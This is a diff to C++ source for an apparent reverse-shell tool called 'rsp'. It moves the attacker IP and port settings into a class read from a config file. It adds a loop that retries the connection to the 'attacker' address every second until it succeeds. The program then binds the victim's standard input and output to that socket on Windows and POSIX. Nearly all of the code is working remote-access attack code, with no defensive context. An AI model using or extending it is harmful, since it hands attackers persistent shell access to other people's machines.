@@ -1,27 +1,43 @@
 #include "rsp.hpp"
+#include <chrono>
 
-auto main(int argc, char** argv) -> int {
-    int port = 3388;
-    std::string ip = "127.0.0.1";
-    std::string config = "default.cfg";
-
-    if(std::filesystem::exists(config)) {
-        std::ifstream file(config);
-        std::string line;
-        if(file.is_open()) {
-            while(std::getline(file, line)) {
-                if(line.find("port") != std::string::npos) {
-                    port = std::atoi(line.substr(5, line.length()).c_str());
-                    std::cout << "rsp >> port - " << port << '\n';
-                } else if(line.find("ip") != std::string::npos) {
-                    ip = line.substr(3, line.length());
-                    std::cout << "rsp >> ip - " << ip << '\n';
+namespace rsp {
+    App::App()
+    : m_port(3388), m_ip("127.0.0.1"), m_configName("default.cfg") {
+        if(std::filesystem::exists(m_configName)) {
+            std::ifstream file(m_configName);
+            std::string line;
+            if(file.is_open()) {
+                while(std::getline(file, line)) {
+                    if(line.find("port") != std::string::npos) {
+                        m_port = std::abs(std::atoi(line.substr(5, line.length()).c_str()));
+                        std::cout << "rsp >> port - " << m_port << '\n';
+                    } else if(line.find("ip") != std::string::npos) {
+                        m_ip = line.substr(3, line.length());
+                        std::cout << "rsp >> ip - " << m_ip << '\n';
+                    }
                 }
-            }
 
-            file.close();
+                file.close();
+            }
         }
     }
+
+    uint16_t& App::GetPort() {
+        return m_port;
+    }
+    
+    std::string& App::GetIP() {
+        return m_ip;
+    }
+    
+    std::string& App::GetConfigName() {
+        return m_configName;
+    }
+};
+
+auto main(int argc, char** argv) -> int {
+    std::unique_ptr<rsp::App> app = std::make_unique<rsp::App>();
 
     #ifdef RSP_WINDOWS
         WSADATA wsaData;
@@ -30,13 +46,15 @@ auto main(int argc, char** argv) -> int {
 
         sockaddr_in attacker;
         attacker.sin_family = AF_INET;
-        attacker.sin_port = htons(port);
-        attacker.sin_addr.s_addr = inet_addr(ip.c_str());
+        attacker.sin_port = htons(app->GetPort());
+        attacker.sin_addr.s_addr = inet_addr(app->GetIP().c_str());
 
-        int code = connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker));
-        if(code != 0) {
-            std::cerr << "rsp >> error - " << code << '\n';
+        while(connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker)) != 0) {
+            std::cerr << "rsp >> cant connect to attacker" << '\n';
+            std::this_thread::sleep_for(std::chrono::seconds(1));
         }
+
+        std::cout << "rsp >> connected successfully" << '\n';
 
         _dup2(victim, 0);
         _dup2(victim, 1);
@@ -49,13 +67,15 @@ auto main(int argc, char** argv) -> int {
 
         sockaddr_in attacker;
         attacker.sin_family = AF_INET;
-        attacker.sin_port = htons(port);
-        attacker.sin_addr.s_addr = inet_addr(ip.c_str());
+        attacker.sin_port = htons(app->GetPort());
+        attacker.sin_addr.s_addr = inet_addr(app->GetIP().c_str());
 
-        int code = connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker));
-        if(code != 0) {
-            std::cerr << "rsp >> error - " << code << '\n';
+        while(connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker)) != 0) {
+            std::cerr << "rsp >> cant connect to attacker" << '\n';
+            std::this_thread::sleep_for(std::chrono::seconds(1));
         }
+
+        std::cout << "rsp >> connected successfully" << '\n';
 
         dup2(victim, 0);
         dup2(victim, 1);
